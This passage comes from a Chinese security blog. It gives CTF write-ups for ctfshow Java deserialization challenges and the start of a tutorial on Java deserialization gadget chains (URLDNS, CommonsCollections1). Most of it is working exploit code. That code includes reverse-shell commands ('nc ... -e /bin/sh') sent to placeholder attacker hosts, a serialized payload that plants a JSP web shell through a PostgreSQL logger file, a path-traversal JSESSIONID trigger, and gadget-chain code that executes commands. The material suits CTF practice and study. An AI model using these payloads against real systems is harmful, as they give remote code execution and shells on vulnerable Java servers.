class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;yso&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;evo1&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;CommonsCollections4&quot;</span><span class="punctuation">,</span><span class="string">&quot;nc vps-shell-ip vps-shell-port -e /bin/sh&quot;</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>改一下<code>server.py</code>中的端口防止和本地的<code>mysql</code>端口冲突</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = start_mysql_server(handle_server, host=<span class="literal">None</span>, port=your-fake_mysql-port)</span><br></pre></td></tr></table></figure><p>接下来就是构造<code>exp</code>了，这里要注意下<code>mysql-connector-java</code>的版本是<code>5.1.39</code>，用反射给<code>Connection</code>类赋值就行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">web856</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Connection</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> connection.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">schema</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;schema&quot;</span>);</span><br><span class="line">        schema.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        schema.set(connection,<span class="string">&quot;jdbc:mysql&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">host</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;host&quot;</span>);</span><br><span class="line">        host.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        host.set(connection,<span class="string">&quot;vps-ip&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">port</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;port&quot;</span>);</span><br><span class="line">        port.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        port.set(connection,vps-port);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">user</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        user.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 这里的username就是你在config.json中设置的值</span></span><br><span class="line">        user.set(connection,<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;evo1&quot;</span>, <span class="string">&quot;123456&quot;</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">database</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;database&quot;</span>);</span><br><span class="line">        database.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        database.set(connection,<span class="string">&quot;detectCustomCollations=true&amp;autoDeserialize=true&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(connection);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payloadBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(payloadBytes);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开启<code>nc</code>监听和<code>MySQL_Fake_Server</code>，然后传输<code>payload</code>就拿到<code>shell</code>了</p><h2 id="web857"><a href="#web857" class="headerlink" title="web857"></a>web857</h2><blockquote><p><a href="https://forum.butian.net/share/1339">https://forum.butian.net/share/1339</a></p></blockquote><p>可以看到多了个<code>postgresql 42.3.1</code>，参考上面的文章写个🐎进去</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">web857</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Connection</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> connection.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">driver</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;driver&quot;</span>);</span><br><span class="line">        driver.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        driver.set(connection,<span class="string">&quot;org.postgresql.Driver&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">schema</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;schema&quot;</span>);</span><br><span class="line">        schema.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        schema.set(connection,<span class="string">&quot;jdbc:postgresql&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">host</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;host&quot;</span>);</span><br><span class="line">        host.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        host.set(connection,<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">port</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;port&quot;</span>);</span><br><span class="line">        port.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        port.set(connection,<span class="number">1234</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">user</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        user.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 这里的username就是你在config.json中设置的值</span></span><br><span class="line">        user.set(connection,<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;evo1&quot;</span>, <span class="string">&quot;123456&quot;</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">database</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;database&quot;</span>);</span><br><span class="line">        database.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        database.set(connection,<span class="string">&quot;password=123456&amp;loggerLevel=debug&amp;loggerFile=../webapps/ROOT/b.jsp&amp;&lt;%Runtime.getRuntime().exec(request.getParameter(\&quot;evo1\&quot;));%&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(connection);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payloadBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(payloadBytes);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没回显，访问页面弹个shell出来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://b8fe834b-fc46-4e5d-92d4-29fd5a383cbd.challenge.ctf.show/b.jsp</span><br><span class="line">POST：</span><br><span class="line">evo1=nc your-ip your-port -e /bin/sh</span><br></pre></td></tr></table></figure><h2 id="web858"><a href="#web858" class="headerlink" title="web858"></a>web858</h2><blockquote><p><a href="https://blog.csdn.net/qq_40898302/article/details/124291764">https://blog.csdn.net/qq_40898302/article/details/124291764</a></p></blockquote><p>题目提示<code>tomcat的session反序列化</code>，进去后看下<code>User</code>类，很明显的命令执行的地方</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="built_in">this</span>.username);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>现在只需要找个反序列化点，根据题目提示和前面列出的博客传个<code>a.session</code>过去，再带着<code>JSESSIONID</code>访问即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">web858</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> user.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">username</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        username.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        username.set(user,<span class="string">&quot;cp /flag /usr/local/tomcat/webapps/ROOT/flag.txt&quot;</span>);</span><br><span class="line">        serialize(user);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;a.session&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成文件后上传可以获得路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/a.session</span><br></pre></td></tr></table></figure><p>写个脚本触发一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://9d725641-84bf-4927-ac30-f167eec758e9.challenge.ctf.show/&#x27;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line"><span class="string">&quot;JSESSIONID&quot;</span>:<span class="string">&quot;../../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/upload/a&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(url=url,cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>访问即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://9d725641-84bf-4927-ac30-f167eec758e9.challenge.ctf.show/flag.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化学习</title>
      <link href="/2023/08/22/java-unser/"/>
      <url>/2023/08/22/java-unser/</url>
      
        <content type="html"><![CDATA[<h1 id="Java反序列化学习"><a href="#Java反序列化学习" class="headerlink" title="Java反序列化学习"></a>Java反序列化学习</h1><blockquote><p>参考：</p><p><a href="https://www.yuque.com/tianxiadamutou/zcfd4v">https://www.yuque.com/tianxiadamutou/zcfd4v</a></p><p><a href="https://github.com/phith0n/JavaThings">https://github.com/phith0n/JavaThings</a></p><p><a href="https://github.com/Y4tacker/JavaSec">https://github.com/Y4tacker/JavaSec</a></p><p><a href="https://github.com/3em0/studyNote">https://github.com/3em0/studyNote</a></p><p><a href="https://github.com/threedr3am/learnjavabug">https://github.com/threedr3am/learnjavabug</a></p><p><a href="https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/">https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/</a></p><p><a href="https://space.bilibili.com/2142877265/">https://space.bilibili.com/2142877265/</a></p></blockquote><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>Java基础，重点是序列化、反序列化、反射、动态代理和类的加载等。</p><h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><h2 id="SerTest-java"><a href="#SerTest-java" class="headerlink" title="SerTest.java"></a>SerTest.java</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.evo1.ser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"><span class="comment">//        Person person = new Person(&quot;aa&quot;,22);</span></span><br><span class="line"><span class="comment">//        System.out.println(person);</span></span><br><span class="line"><span class="comment">//        serialize(person);</span></span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://2kniltiw1gy0mse6vrq3vdno9ff53u.burpcollaborator.net&quot;</span>);</span><br><span class="line">        <span class="comment">// 修改初始的hashCode，使得序列化时不会触发</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">urlfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        urlfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        urlfield.set(url,<span class="number">1234</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">        urlfield.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="UnserTest-java"><a href="#UnserTest-java" class="headerlink" title="UnserTest.java"></a>UnserTest.java</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.evo1.ser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"><span class="comment">//        Person person = (Person) unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"><span class="comment">//        System.out.println(person);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/">CC1链</a></p><p>maven配置要把依赖都加进来</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/junit/junit --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>想要能看到源码而不是class下载<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">这个</a>，注意源码地址导入是要在sourcepath</p><p>运行时，这一句出现该报错</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="comment">//Incompatible types. Found: &#x27;java.lang.reflect.Method&#x27;, required: &#x27;jdk.internal.org.objectweb.asm.commons.Method&#x27;</span></span><br></pre></td></tr></table></figure><p>去看看前面导入的包是不是不对</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//应该是</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="comment">//但是导入的是</span></span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.commons.Method;</span><br></pre></td></tr></table></figure><h2 id="TransformedMap版"><a href="#TransformedMap版" class="headerlink" title="TransformedMap版"></a>TransformedMap版</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.evo1.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_TransformedMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException &#123;</span><br><span class="line">        <span class="comment">// 1. 基本弹计算器</span></span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 简单反射</span></span><br><span class="line"><span class="comment">//        Runtime r = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//        Class c = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method execMethod = c.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//        execMethod.invoke(r,&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 现在需要找一个地方来触发弹计算器，使用InvokerTransformer</span></span><br><span class="line"><span class="comment">//        Runtime r = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 现在只需要找一个地方也调用了transform方法，找一下发现可以用TransformedMap里的checkSetValue</span></span><br><span class="line">        <span class="comment">// 然后找哪里会使用TransformedMap.checkSetValue，最后发现可以用MapEntry</span></span><br><span class="line">        <span class="comment">// InvokerTransformer.transform&lt;-TransformedMap.checkSetValue&lt;-MapEntry.setValue</span></span><br><span class="line"><span class="comment">//        Runtime r = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        map.put(&quot;key&quot;,&quot;value&quot;);</span></span><br><span class="line"><span class="comment">//        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer);</span></span><br><span class="line"><span class="comment">//        //通过遍历来触发</span></span><br><span class="line"><span class="comment">//        for (Map.Entry entry:transformedMap.entrySet())&#123;</span></span><br><span class="line"><span class="comment">//            entry.setValue(r);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.找一个类里面使用了setValue，并且最好是直接在readObject里面，这样可以直接触发</span></span><br><span class="line">        <span class="comment">// 发现AnnotationInvocationHandler里的readObject刚好满足要求，然后有几个小点要注意</span></span><br><span class="line">        <span class="comment">// a.需要反射获取runtime(runtime本身是不可以序列化的)</span></span><br><span class="line">        <span class="comment">// b.需要反射获取AnnotationInvocationHandler(因为不是public)</span></span><br><span class="line">        <span class="comment">// c.满足readObject中的一些触发条件</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 基础版本反射获取runtime</span></span><br><span class="line"><span class="comment">//        Class c = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method getRuntimeMethod = c.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line"><span class="comment">//        Runtime r = (Runtime) getRuntimeMethod.invoke(null,null);</span></span><br><span class="line"><span class="comment">//        Method execMethod = c.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//        execMethod.invoke(r,&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改为InvokerTransformer版本</span></span><br><span class="line"><span class="comment">//        Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用ChainedTransformer实现链式调用</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">// ConstantTransformer最后调用时需要，前面按流程写链子时可先不写</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(Runtime.class); //使用本语句时注释掉前面链子中的ConstantTransformer</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//  转化下chainedTransformer</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span 